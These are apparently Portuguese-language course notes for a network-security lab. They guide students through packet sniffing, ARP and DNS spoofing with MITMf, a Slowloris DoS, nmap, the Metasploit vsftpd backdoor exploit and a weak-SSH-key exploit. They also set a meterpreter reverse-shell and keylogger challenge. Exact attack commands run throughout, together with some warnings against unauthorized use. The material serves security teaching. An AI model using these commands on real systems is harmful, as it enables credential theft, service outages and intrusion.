# Segurança

Caso seja o Linux:

Fazer download: https://drive.google.com/file/d/0BzmYQVmw4W7nTVVfeURTV2hySk0/view?usp=sharing\&resourcekey=0-KyFKKzYIGHWgxb4rnYbaTA Descompactar e realizar a instalação, depois ir até o terminal e digitar: sudo apt-get install libcap2-bin wireshark sudo chgrp (#seu usuario#) /usr/bin/dumpcap sudo chmod 750 /usr/bin/dumpcap sudo setcap cap\_net\_raw,cap\_net\_admin+eip /usr/bin/dumpcap wireshark

Iremos agora verificar o que um usuário mal intencionado poderá fazer para analisar protocolos que estão passando na rede.

Abra o Wireshark, que deve ter sido instalado junto com o GNS3. Escolha a placa de rede de seu computador. No filtro, coloque o protocolo HTTP.

Como fizemos no vídeo, abra um site que utilize o protocolo HTTP, por exemplo o blog da Alura. Volte para o Wireshark e procure pela requisição GET.

Tente encontrar na análise mais detalhada, informações da página acessada. Qual o resultado?

Ao procurar pela requisição GET, temos na análise mais detalhada do protocolo que houve uma requisição para o host blog.alura.com.br. Dessa forma, podemos confirmar que a vítima acessou esse site:

Vamos repetir a análise do Wireshark.

Caso tenha interrompido a análise, clique no botãoWireshark\_botao Entre agora no link: http://exemplo-login-fraco-alura.herokuapp.com/login (A página poderá demorar alguns segundos para aparecer) Coloque um usuário e senha de sua preferência e clique em Logar Clique com o botão direito do mouse em Inspecionar Elemento e veja como está o HTML desse formulário. Qual requisição está sendo usada? Em seguida, volte ao Wireshark e procure pela requisição encontrada. É possível ver o usuário e senha digitados?

Ao pressionar o botão direito do mouse na página, temos que a requisição utilizada é POST.

Ao clicar no botão Logar e analisarmos o Wireshark, temos a requisição POST e vemos o login e senha cadastrados na aba HTML Form URL encoded.

Antes de realizar os ataques precisamos fazer o download de nossas máquinas virtuais:

Primeiramente, realize o download do VirtualBox para seu sistema operacional, ele irá gerenciar nossas máquinas virtuais Posteriormente realize o download da máquina do hacker, o Kali Linux (64 bits).

Importante: Caso seja necessário o uso de senha, como o uso do sudo, esta imagem utiliza o usuário root e a senha toor

Uma vez que o download foi concluído, abra o VirtualBox e clique em Importar Appliance.

Confirme a importação clicando no botão Importar. Clique no botão Configurações. Clique na aba Sistema e altere a memória para atender as configurações do seu computador. O mínimo que eu recomendo seria 1024 MB.

Em seguida, clique na aba Rede e altera para Conectado a: placa de rede exclusivo de hospedeiro (host-only)

Caso apareça alguma configuração inválida do USB, clique na aba USB e altere para Controladora USB 1.1 (OHCI).

Iremos utilizar o Kali Linux como sendo a máquina do hacker, uma ferramenta com muitas configurações pré-instaladas para os testes de penetração de redes.

Importante: Caso seja necessário o uso de senha, como o uso do sudo, esta imagem utiliza o usuário root e a senha toor

Caso o aluno tenha familiaridade com o Docker, poderá utilizá-lo. Durante o curso, usarei a máquina virtual.

Obs: A última versão do GNS3 que se encontra no site atual apresenta algumas funcionalidades diferenciadas com relação a versão do curso, seguem os passos de instalação da versão utilizada no curso

Vamos realizar a instalação do GNS3 programa que será capaz de emular equipamentos de rede e que já vem instalado o Wireshark:

Acesse este link e faça o Download referente ao seu sistema operacional.

Windows: GNS3-1.5.2-all-in-one.exe Mac: GNS3-1.5.2.dmg Linux: GNS3-1.5.2.source.zip Durante o processo de instalação, desmarque a opção referente ao SolarWinds Response e marque todas as outras opções, inclusive o Npcap

Caso a instalação pergunte no fim se queremos uma licença trial do SolarWinds selecionamos a opção No.

Para esse exercício você precisará do Packet Tracer, caso não o tenha instalado, poderá encontrar os passos de instalação nesse link: https://cursos.alura.com.br/course/redes-introducao/task/20470

Uma vez que o GNS3 não suporta os processadores dos switches da Cisco, iremos utilizar o programa Cisco Packet Tracer cujo download foi feito na etapa anterior.

Abra o Packet Tracer Arraste para a área de trabalho um switch, dois computadores e um servidor. Devemos ter o seguinte cenário:

Configure os endereços IP para que todos estejam na mesma rede e possam assim se comunicar (por exemplo: 192.168.99.X). Clique no Switch e vá até a aba CLI. Escolha um dos dois computadores para atuar como se fosse o hacker. Faça a configuração para que o switch só aceite na porta o endereço mac da máquina que está conectada. Desconecte essa porta e conecte outro computador. Tente realizar o ping, qual o resultado?

Dicas:

Para configurar o switch:

Mude o modo de configuração para privilegiado. Entre na interface a ser configurada. Mude a forma de operação da porta, estamos conectando um dispositivo final. Devemos alterar para modo acesso. Habilite a segurança da porta. Configure a segurança da porta para trabalhar com somente um endereço mac.

A configuração do switch deverá estar parecida com:

interface FastEthernet0/2 switchport mode access switchport port-security switchport port-security mac-address \[endereço MAC]

Dessa forma, estamos configurando essa porta para aceitar somente um endereço mac. Caso o hacker tente realizar esse ataque inserindo vários endereços mac, a porta do switch irá desabilitar e o hacker não terá sucesso.

Nessa etapa, o Kali Linux e a máquina virtual do Windows (caso seja utilizada) deverão estar com as placas de rede configuradas em Conectado a: Placa em modo Bridge

Vá ao Kali Linux, abra o terminal e faça a instalação da ferramenta para realizar o ataque: apt-get install mitmf Uma vez que o download foi concluído, rode o ataque com o seguinte comando: mitmf --arp --spoof --target \[IP vítima] --gateway \[IP roteador] -i \[interface] Volte ao computador da vítima e abra a página de login: http://exemplo-login-fraco-alura.herokuapp.com/login (Pode demorar um pouco para a página carregar, caso não carregue na primeira vez, espera alguns minutos e dê o refresh na página). Faça o "cadastro" e pressione o botão Logar Volte ao Kali Linux, qual é o resultado?

Uma vez que o ataque foi executado, manipulamos a tabela ARP da vítima e do roteador e ficamos no meio da comunicação entre ambos. Uma vez que estamos no meio da comunicação, somos capazes de visualizar o tráfego entre a vítima e o roteador. Ao analisar o resultado no Kali Linux, devemos ter o usuário e senha que a vítima havia se cadastrado:

Vamos agora alterar a tradução DNS para ser redirecionada para um IP de nosso controle:

Interrompa o teste anterior do MITM pressionando CTRL + C No terminal coloque um editor de sua preferência, como o Gedit. Altere a URL do blog da Alura para o endereço IP do Kali Linux e salve o arquivo.

Vamos agora alterar a tradução DNS para ser redirecionada para um IP de nosso controle:

Interrompa o teste anterior do MITM pressionando CTRL + C No terminal coloque um editor de sua preferência, como o Gedit. Altere a URL do blog da Alura para o endereço IP do Kali Linux e salve o arquivo. \*.dominio.xpt.xyz=ip\_maquina

Vá até a opção Show Applications e digite no campo de busca Leafpad

Abra o Leafpad e digite o seguinte código

## Curso segurança redes da Alura :)

Salve esse arquivo dentro do diretório /var/www/html com o nome index.html. Abra outro terminal e inicialize o servidor da apache com o seguinte comando: service apache2 start. Volte ao primeiro terminal do Kali Linux e execute o ataque com o seguinte código:

mitmf --arp --spoof --target \[IP vítima] --gateway \[IP roteador] -i \[interface] --dns

No computador da vítima feche todas as janelas, abra o browser novamente e limpe o cache, posteriormente digite: blog.alura.com.br. Qual o resultado?

Uma vez que estamos no meio da comunicação entre a vítima e o roteador, fomos capazes de alterar o redirecionamento de uma URL para um endereço IP de nosso controle. Dessa forma, quando a vítima digitar em seu browser blog.alura.com.br, ela verá o código HTML que colocamos dentro do diretório /var/www/html.

Vamos ilustrar um ataque DoS com o Slowloris:

Baixar o servidor usado para os testes nesse link e extraia para uma pasta de sua preferência Uma vez que o arquivo foi baixado, devemos configurá-lo no VirtualBox. Clique na aba Novo e dê um nome para a máquina virtual (Por exemplo: Servidor) Ajuste o tamanho de memória para seu computador, o mínimo que eu recomendo seria 512MB. Na sequência selecionar a opção Utilizar um disco rígido virtual existente e escolher o arquivo extraído na etapa anterior. Feito isso clique no botão Criar Vá até a aba Configurações e altere a placa de rede do servidor para Conectado a: Placa em modo bridge Inicialize o servidor, para logar, entre com usuário e senha: msfadmin Verifique qual é seu endereço IP digitando o comando: ifconfig

Com esse endereço IP, vá até a máquina do Hacker e coloque na URL esse endereço IP. Clique no link da Mutillidae e verifique que tudo está funcionando normalmente. No Kali Linux, abra o terminal e digite: git clone https://github.com/llaera/slowloris.pl.git. Verifique se o diretório slowloris.pl foi criado digitando o comando: ls. Mude para o diretório do slowloris.pl digitando: cd slowloris.pl/. Mude a permissão para que seja possível executar o programa através do comando: chmod +x slowloris.pl. Rode o programa com: ./slowloris.pl. Veja que o slowloris mostra como devemos rodar o programa, coloque no terminal: perl ./slowloris.pl -dns \[IP servidor] -timeout 1. Abra um browser do seu computador e tente acessar a página da Mutillidae: \[IP do servidor]/mutillidae.

Qual o resultado?

O Slowloris abre mútiplas conexões com o alvo de destino e tenta manter essas conexões ativas pelo máximo tempo possível. O Slowloris encaminha continuamente requisições HTTP de forma parcial, as quais não são completadas. Os serviços que são alvos desse ataque podem manter essas conexões abertas aguardando que as requisições iniciadas sejam completadas. Dessa forma, a ideia é que em algum momento, o pool de conexões será consumido e novas requisições legítimas não serão processadas.

Obs: Não use essas técnicas sem autorização!

Faça uma varredura dos serviços e versões que estão rodando no servidor através do network mapper (nmap):

Abra o terminal e digite: nmap -A \[IP do servidor] Qual o resultado?

O Nmap (Network Mapper) é um programa usado para reconhecimento de hosts e serviços que estão rodando em determinada rede, sendo assim uma ferramenta muito útil para verificar possíveis vulnerabilidades que possam exisitir.

Obs: Não use o nmap e demais testes sem permissão!

Descobrimos com o Nmap os serviços que estão rodando em nosso servidor, na análise, descobrimos que o servidor possui a porta 21 aberta e que a versão referente a esse serviço seria vsftpd 2.3.4.

Vimos no vídeo que essa versão apresenta uma vulnerabilidade, vamos explorá-la com um framework que possui vários códigos com o intuito de explorar vulnerabilidades, os exploits. Temos no Kali Linux o Metasploit, que possui já pré instalado uma série de exploits. Vamos explorar a vulnerabilidade dessa versão com o objetivo de ganhar acesso do servidor.

No Kali Linux, abra o Metasploit

Selecione o exploit que iremos usar para explorar essa vulnerabilidade, digitando: use exploit/unix/ftp/vsftpd\_234\_backdoor Configure o alvo do teste: set RHOST \[IP do servidor] Rode o código digitando: exploit Qual foi o resultado?

Ao rodar esse exploit, conseguimos explorar a vulnerabilidade que existia nessa versão, ganhando assim acesso ao servidor:

Vamos agora testar as vulnerabilidades no servidor de forma automatizada com o Nessus:

Abra o browser no Kali Linux e coloque a url a seguir: http://www.tenable.com/products/nessus/select-your-operating-system. Escolha o sistema operacional Linux e faça download do arquivo: Nessus-6.9.1-debian6\_amd64.deb Uma vez que o Download foi concluído, mude para o diretório onde o download foi realizado (por exemplo: cd Download/) e faça a extração e instalação do arquivo com o seguinte comando: dpkg -i Nessus-6.9.1-debian6\_amd64.deb Inicialize o Nessus com o comando: /etc/init.d/nessusd start Clique neste link e peça o código de ativação para poder finalizar a instalação do Nessus. Preencha o formulário com um endereço de e-mail válido Com o código de ativação, vá ao browser do Kali Linux, e coloque a url: https://kali:8834/ Clique em Advanced e posteriormente em Add exception Clique em Confirm Security Exception para confirmar a exceção Feito isso, devemos ter a página de instalação do Nessus

Clique no botão Continue e na sequência coloque seu usuário e senha de preferência Na sequência insira o código de ativação enviado pelo Nessus O download deverá iniciar. O download pode demorar até ser concluído.

Uma vez que o download do Nessus for concluído, iremos executar os testes para verificar de forma automática as possíveis vulnerabilidades de nossa aplicação:

Faça login no Nessus com o usuário e senha que foram cadastrados. Clique na aba New Scan para iniciar um novo teste. Configure o teste e coloque o nome e descrição de sua preferência, na última aba coloque o endereço IP do servidor. Por exemplo:

Salve o scan e inicialize a varredura, pressionando o botão Launch.

O teste poderá demorar. Qual o resultado?

Por meio do teste do Nessus foi possível verificar que possuímos vulnerabilidades de nível crítico em nosso servidor.

Pela varredura que o Nessus realizou, descobrimos que a versão do OpenSSH apresenta uma vulnerabilidade na geração das chaves, documentada na Common Vulnerabilities and Exposure (CVE) com a referência 2008-0166.

Ao procurar por essa referência descobrimos que existem códigos exploits para essa vulnerabilidade. Vamos explorar essa vulnerabilidade que foi descoberta pelo Nessus:

No Kali Linux, vá ao browser e acesse este link. Na aba exploit, clique em Download Ao ler a documentação do autor do código temos os passos a serem executados para realizarmos o ataque: Abra uma outra aba no browser e realize o download das chaves neste link. (Obs: cuidado ao realizar download de exploits na internet). No terminal do Kali Linux, altere para o diretório onde os arquivos foram salvos, por exemplo cd Downloads/ Faça a extração do arquivo, digitando: bunzip2 5622.tar.bz2 e posteriormente digite: tar xvf 5622.tar Execute o ataque digitando no terminal: python 5720.py \[\*caminho completo onde o diretório com as chaves foram salvos] \[IP do servidor] root 22 O processo poderá demorar. A chave foi encontrada? Tente rodar o comando e ver se o acesso ao servidor é obtido. \*Exemplo de caminho completo das chaves: /root/Downloads/rsa/2048/.

Uma vez que rodamos esse exploit, temos a informação de que podemos ganhar acesso do servidor com a chave que foi encontrada. Ao executar o comando, vemos que de fato, conseguimos ganhar acesso. Mesmo que havia uma senha, ocorria um problema na geração das chaves de autenticação e com esse ataque de força bruta foi possível descobrir qual era essa chave.

Como desafio, tente recriar o Reverse Shell feito em aula e tente conferir tudo que a vítima digitou em seu teclado.

Dicas:

Utilize o framework do Metasploit e a função msfvenom. Lembre-se de colocar o payload: windows/meterpreter/reverse\_tcp, LHOST e salve esse arquivo com extensão .exe Na sequência, prepare o Kali Linux para receber essa conexão reversa. Lembre-se de utilizar o exploit/multi/handler, de setar o payload que estamos aguardando de retorno: windows/meterpreter/reverse\_tcp e de informar o endereço IP local LHOST. Por fim rode esse código com exploit Mande esse arquivo para o computador do Windows e execute o arquivo Utilize o keylogrecorder para gravar as informações da vítima Não faça isso com outras pessoas
